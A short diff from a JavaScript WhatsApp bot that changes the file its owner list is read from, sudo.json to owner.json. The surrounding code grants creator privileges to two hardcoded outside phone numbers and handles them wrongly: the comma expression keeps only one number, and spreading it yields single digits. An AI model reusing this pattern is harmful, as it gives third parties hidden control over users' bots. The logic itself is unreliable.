@@ -321,7 +321,7 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
   const udp = botNumber.split('@')[0];
     const dave = ('2347013349642', '2349133354644');
     
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
+    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  
     
     let isCreator = [udp, ...dave, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
